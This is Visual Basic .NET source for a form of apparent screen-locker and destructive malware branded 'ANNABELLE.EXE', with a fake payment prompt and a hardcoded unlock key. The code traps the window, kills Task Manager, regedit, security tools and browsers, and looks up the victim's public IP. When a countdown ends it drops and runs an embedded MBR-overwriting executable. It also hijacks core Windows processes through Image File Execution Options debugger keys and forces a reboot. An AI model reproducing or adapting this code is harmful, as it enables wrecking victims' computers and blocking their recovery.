Imports System.Net.Mail
Imports System.Threading.Thread
Imports System.IO
Imports System.Text
Imports System.Text.RegularExpressions
Imports System.Runtime.InteropServices
Imports Microsoft.Win32


Public Class Form2
    Protected Overrides ReadOnly Property CreateParams() As CreateParams
        Get
            Dim cp As CreateParams = MyBase.CreateParams
            Const CS_NOCLOSE As Integer = &H200
            cp.ClassStyle = cp.ClassStyle Or CS_NOCLOSE
            Return cp
        End Get
    End Property
    <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> Private Shared Function SendMessage(ByVal hWnd As IntPtr, ByVal Msg As UInteger, ByVal wParam As IntPtr, ByVal lParam As IntPtr) As IntPtr
    End Function
    Const WM_APPCOMMAND As UInteger = &H319
    Const APPCOMMAND_VOLUME_UP As UInteger = &HA

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        MsgBox("You didnt paid yet.", MsgBoxStyle.Critical, "ANNABELLE.EXE")
    End Sub

    Private Sub Form2_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        If (e.CloseReason = CloseReason.UserClosing) Then
            e.Cancel = True
        End If
    End Sub

    Dim str2 As New Net.WebClient
    Function Func1234()



        Try
            Dim str5 As String = str2.DownloadString("http://myip.dnsomatic.com/")

            Return str5

        Catch ex As Exception
            'MsgBox("Error Please start me again.")
        End Try
#Disable Warning BC42105 ' Die Funktion "Func1234" gibt nicht für alle Codepfade einen Wert zurück. Wenn das Ergebnis verwendet wird, kann zur Laufzeit eine NULL-Verweisausnahme auftreten.
    End Function
#Enable Warning BC42105 ' Die Funktion "Func1234" gibt nicht für alle Codepfade einen Wert zurück. Wenn das Ergebnis verwendet wird, kann zur Laufzeit eine NULL-Verweisausnahme auftreten.

    Private Sub Form2_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load

        If System.Environment.Is64BitOperatingSystem = True Then
            'Nothing
        Else
            MsgBox("The Program is on a 32 Bit Operating System not available, because 32 Bit is outdated.", MsgBoxStyle.Critical, "ANNABELLE.EXE")
            Me.Close()
        End If
        Timer3.Start()
        Lengthh.Hide()
        Dim pool As String = ""
        pool = ""

        pool = pool & "0123456789"
        pool = pool & "abcdefghijklmnopqrstuvwxyz"
        pool = pool & "ABCDEFGHIJKLMNOPQRSTUVWXYZ"


        Dim count = 0
        Result.Text = ""

        Dim cc As New Random
        Dim strpos = ""
        While count <= Lengthh.Text
            strpos = cc.Next(0, pool.Length)

            Result.Text = Result.Text & pool(strpos)
            count = count + 1

        End While
        Me.Visible = False
        RichTextBox1.SelectionStart = 2   ' hier den Startindex eintragen
        RichTextBox1.SelectionLength = 27  ' hier die Länge eintragen
        RichTextBox1.SelectionFont = New Font("Calibri", 15, FontStyle.Bold)
        RichTextBox1.SelectionStart = 150   ' hier den Startindex eintragen
        RichTextBox1.SelectionLength = 30  ' hier die Länge eintragen
        RichTextBox1.SelectionFont = New Font("Calibri", 15, FontStyle.Bold)
        RichTextBox1.SelectionStart = 490   ' hier den Startindex eintragen
        RichTextBox1.SelectionLength = 33  ' hier die Länge eintragen
        RichTextBox1.SelectionFont = New Font("Calibri", 15, FontStyle.Bold)
        RichTextBox1.SelectionStart = 628   ' hier den Startindex eintragen
        RichTextBox1.SelectionLength = 47  ' hier die Länge eintragen
        RichTextBox1.SelectionFont = New Font("Calibri", 15, FontStyle.Bold)
        RichTextBox1.SelectionStart = 892   ' hier den Startindex eintragen
        RichTextBox1.SelectionLength = 36  ' hier die Länge eintragen
        RichTextBox1.SelectionFont = New Font("Calibri", 15, FontStyle.Bold)
        If File.Exists("C:\Detect.txt") Then
            Timer1.Stop()
            Timer2.Interval = 30
            Timer2.Start()
            My.Computer.Audio.Stop()
            My.Computer.Audio.Play(My.Resources.annabelle, AudioPlayMode.BackgroundLoop)

        Else
            For a = 100 To 1 Step -1
                SendMessage(Me.Handle, WM_APPCOMMAND, &H30292, APPCOMMAND_VOLUME_UP * &H10000)
            Next
            My.Computer.Audio.Play(My.Resources.childsound, AudioPlayMode.WaitToComplete)
            My.Computer.Audio.Stop()
            My.Computer.Audio.Play(My.Resources.annabelle, AudioPlayMode.BackgroundLoop)
        End If

        If File.Exists("C:\AfterMBR.txt") Then
            Timer5.Start()
        Else
            'Nothing
        End If


        Dim path As String = "C:\Detect.txt"
        Dim fs As FileStream = File.Create(path)
        Dim info As Byte() = New UTF8Encoding(True).GetBytes("Detect")
        fs.Write(info, 0, info.Length)
        fs.Close()

        ListBox1.Hide()
        Cursor.Hide()
        Cursor.Show()
    End Sub

    Private Sub Button1_KeyDown(sender As Object, e As KeyEventArgs) Handles Button1.KeyDown
        If e.KeyData = Keys.Alt + Keys.F4 Then
            MessageBox.Show("Annabelle" + Environment.NewLine + "Just" + Environment.NewLine + "Wants" + Environment.NewLine + "To", "Play", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
            e.Handled = True
        End If
    End Sub

    Private Sub TextBox1_KeyDown(sender As Object, e As KeyEventArgs) Handles TextBox1.KeyDown
        If e.KeyData = Keys.Alt + Keys.F4 Then
            MessageBox.Show("Annabelle" + Environment.NewLine + "Just" + Environment.NewLine + "Wants" + Environment.NewLine + "To", "Play", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
            e.Handled = True
        End If
        If e.KeyData = Keys.End Then
            MessageBox.Show("Annabelle" + Environment.NewLine + "Just" + Environment.NewLine + "Wants" + Environment.NewLine + "To", "Play", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
            e.Handled = True
        End If
        If e.KeyData = Keys.Enter Then
        End If
    End Sub

    Private Sub TextBox2_KeyDown(sender As Object, e As KeyEventArgs)
        If e.KeyData = Keys.Alt + Keys.F4 Then
            MessageBox.Show("Annabelle" + Environment.NewLine + "Just" + Environment.NewLine + "Wants" + Environment.NewLine + "To", "Play", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
            e.Handled = True
        End If
        If e.KeyData = Keys.End Then
            MessageBox.Show("Annabelle" + Environment.NewLine + "Just" + Environment.NewLine + "Wants" + Environment.NewLine + "To", "Play", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
            e.Handled = True
        End If
        If e.KeyData = Keys.Enter Then
        End If
    End Sub

    Private Sub Form2_Shown(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Shown
        Form1.Close()
        Form1.Hide()
        Label1.Text = Func1234()
        Timer1.Interval = 1000
        Timer1.Start()
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Me.Label2.Text = Label2.Text - 1
        If Label2.Text = "500" Then
            Dim path As String = "C:\AfterMBR.txt"

            Dim fs As FileStream = File.Create(path)

            Dim info As Byte() = New UTF8Encoding(True).GetBytes("AfterMBR")
            fs.Write(info, 0, info.Length)
            fs.Close()
        End If
        If Label2.Text = "0" Then Timer1.Stop()
        If Label2.Text = "0" Then
            Dim aakam031 As String = My.Computer.FileSystem.SpecialDirectories.Temp
            Dim akam As String = aakam031 + "MBRiCoreX.exe"
            IO.File.WriteAllBytes(akam, My.Resources.MBRiCoreX)
            Process.Start(akam)
        End If
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Me.Label2.Text = Label2.Text - 1
        If Label2.Text = "500" Then
            Dim path As String = "C:\AfterMBR.txt"

            Dim fs As FileStream = File.Create(path)

            Dim info As Byte() = New UTF8Encoding(True).GetBytes("AfterMBR")
            fs.Write(info, 0, info.Length)
            fs.Close()
        End If
        If Label2.Text = "0" Then Timer2.Stop()
        If Label2.Text = "0" Then
            Dim aakam031 As String = My.Computer.FileSystem.SpecialDirectories.Temp
            Dim akam As String = aakam031 + "MBRiCoreX.exe"
            IO.File.WriteAllBytes(akam, My.Resources.MBRiCoreX)
            Process.Start(akam)
        End If
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        ListBox1.Show()
        Try
            For Each foundDirectory As String In
                               My.Computer.FileSystem.GetDirectories(
                                   My.Computer.FileSystem.SpecialDirectories.MyDocuments,
                                   FileIO.SearchOption.SearchTopLevelOnly)
                For Each foundFile As String In My.Computer.FileSystem.GetFiles(
            foundDirectory)
                    If foundFile.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundFile2 As String In My.Computer.FileSystem.GetFiles(
          My.Computer.FileSystem.SpecialDirectories.MyDocuments)

                If foundFile2.EndsWith("desktop.ini") Then
                Else
                    ListBox1.Items.Add(foundFile2)
                End If
            Next
        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
                               My.Computer.FileSystem.GetDirectories(
                                   My.Computer.FileSystem.SpecialDirectories.MyMusic,
                                   FileIO.SearchOption.SearchTopLevelOnly)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
            foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundFile4 As String In My.Computer.FileSystem.GetFiles(
       My.Computer.FileSystem.SpecialDirectories.MyMusic)

                If foundFile4.EndsWith("desktop.ini") Then
                Else
                    ListBox1.Items.Add(foundFile4)
                End If
            Next
        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
                               My.Computer.FileSystem.GetDirectories(
                                   My.Computer.FileSystem.SpecialDirectories.MyPictures,
                                   FileIO.SearchOption.SearchTopLevelOnly)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
            foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundFile4 As String In My.Computer.FileSystem.GetFiles(
       My.Computer.FileSystem.SpecialDirectories.MyPictures)

                If foundFile4.EndsWith("desktop.ini") Then
                Else
                    ListBox1.Items.Add(foundFile4)
                End If
            Next
        Catch ex As Exception
        End Try
        Try
            For Each foundDirectory3 As String In
                               My.Computer.FileSystem.GetDirectories(
                                   "C:\Users\" + Environment.UserName + "\Downloads",
                                   FileIO.SearchOption.SearchTopLevelOnly)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
            foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

            '        End Try
            'Try
            'For Each foundDirectory3 As String In
            'My.Computer.FileSystem.GetDirectories(
            '             "C:\Users\" + Environment.UserName + "\Downloads",
            '             FileIO.SearchOption.SearchAllSubDirectories)
            '         For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
            '     foundDirectory3)
            '
            '        If foundFile3.EndsWith("desktop.ini") Then
            '       Else
            '       ListBox1.Items.Add(foundFile3)
            '      End If
            '      Next
            '      Next

            '   Catch ex As Exception

        End Try
        Try
            For Each foundFile4 As String In My.Computer.FileSystem.GetFiles("C:\Users\" + Environment.UserName + "\Downloads")

                If foundFile4.EndsWith("desktop.ini") Then
                Else
                    ListBox1.Items.Add(foundFile4)
                End If
            Next
        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
                               My.Computer.FileSystem.GetDirectories(
                                   "C:\Users\" + Environment.UserName + "\Desktop",
                                   FileIO.SearchOption.SearchTopLevelOnly)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
            foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
            My.Computer.FileSystem.GetDirectories(
                              "C:\Users\" + Environment.UserName + "\Desktop",
                             FileIO.SearchOption.SearchAllSubDirectories)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
           foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
        Try
            For Each foundFile4 As String In My.Computer.FileSystem.GetFiles("C:\Users\" + Environment.UserName + "\Desktop")
                If foundFile4.EndsWith("desktop.ini") Then
                Else
                    ListBox1.Items.Add(foundFile4)
                End If
            Next
        Catch ex As Exception

        End Try
        Try
            For Each foundDirectory3 As String In
                               My.Computer.FileSystem.GetDirectories(
                                   "D:\",
                                   FileIO.SearchOption.SearchTopLevelOnly)
                For Each foundFile3 As String In My.Computer.FileSystem.GetFiles(
            foundDirectory3)

                    If foundFile3.EndsWith("desktop.ini") Then
                    Else
                        ListBox1.Items.Add(foundFile3)
                    End If
                Next
            Next

        Catch ex As Exception

        End Try
    End Sub

    Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click
        ListBox1.Hide()
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        'If TextBox1.Text = System.Environment.MachineName & "wHYecVx64uX2zjVedeTeyRLN" Then
        If TextBox1.Text = "wHYecVx64uX2zjVedeTeyRLN" Then
            Form3.Show()
            Me.Hide()
            Me.Close()
        Else
            Dim a As Integer
            While a < 10
                Me.Location = New Point(Me.Location.X + 10, Me.Location.Y)
                System.Threading.Thread.Sleep(50)
                Me.Location = New Point(Me.Location.X - 10, Me.Location.Y)
                System.Threading.Thread.Sleep(50)
                a += 1
            End While
            MsgBox("The Key is wrong!", MsgBoxStyle.Critical, "ANNABELLE.EXE")
            MsgBox("Its not time to go away, annabelle wants to play :)", MsgBoxStyle.Critical, "ANNABELLE.EXE")
        End If
    End Sub

    Private Sub Button6_Click(sender As Object, e As EventArgs) Handles Button6.Click
        MsgBox("Big thanks to 'Siam Alam' for tips :) and 'Elektro Berkay / rootabx' for ideas & other shit!", MsgBoxStyle.Information, "ANNABELLE.EXE")
        Form4.Show()
    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        For Each a In Process.GetProcessesByName("ProcessHacker")
            a.Kill()
        Next
        For Each a In Process.GetProcessesByName("procexp64")
            a.Kill()
        Next
        For Each a In Process.GetProcessesByName("msconfig")
            a.Kill()
        Next
        For Each a In Process.GetProcessesByName("taskmgr")
            a.Kill()
        Next
        For Each a In Process.GetProcessesByName("chrome")
            a.Kill()
        Next
        For Each a In Process.GetProcessesByName("firefox")
            a.Kill()
        Next
        For Each a In Process.GetProcessesByName("regedit")
            a.Kill()
        Next
        For Each a In Process.GetProcessesByName("opera")
            a.Kill()
        Next
        For Each a In Process.GetProcessesByName("UserAccountControlSettings")
            a.Kill()
        Next
        For Each a In Process.GetProcessesByName("yandex")
            a.Kill()
        Next
        For Each a In Process.GetProcessesByName("microsoftedge")
            a.Kill()
        Next
        For Each a In Process.GetProcessesByName("microsoftedgecp")
            a.Kill()
        Next
        For Each a In Process.GetProcessesByName("iexplore")
            a.Kill()
        Next
    End Sub

    Private Sub Button8_Click(sender As Object, e As EventArgs) Handles Button8.Click
        MsgBox("Are you good enough to kill me?", MsgBoxStyle.Critical, "ANNABELLE.EXE")
        MsgBox("No you arent :D", MsgBoxStyle.Critical, "ANNABELLE.EXE")
        MsgBox("Are you good enough to kill me?", MsgBoxStyle.Critical, "ANNABELLE.EXE")
        MsgBox("No you arent :D", MsgBoxStyle.Critical, "ANNABELLE.EXE")
    End Sub

    Private Sub Timer5_Tick(sender As Object, e As EventArgs) Handles Timer5.Tick
        Explorer()
        Csrss()
        Wininit()
        Userinit()
        Svchost()
        Winlogon()
    End Sub
    Public Sub Explorer()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe", True)
        key.SetValue("Debugger", Application.ExecutablePath)
    End Sub
    Public Sub Csrss()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe", True)
        key.SetValue("Debugger", "RIP")
    End Sub
    Public Sub Wininit()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wininit.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\wininit.exe", True)
        key.SetValue("Debugger", "RIP")
    End Sub
    Public Sub Userinit()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\userinit.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\userinit.exe", True)
        key.SetValue("Debugger", "RIP")
    End Sub
    Public Sub Svchost()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe", True)
        key.SetValue("Debugger", "RIP")
    End Sub
    Public Sub Winlogon()
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winlogon.exe", RegistryKeyPermissionCheck.Default)
        regKey.Close()

        Dim key As RegistryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winlogon.exe", True)
        key.SetValue("Debugger", "RIP")
        System.Diagnostics.Process.Start("shutdown", "-r -t 00 -f")
    End Sub
End Class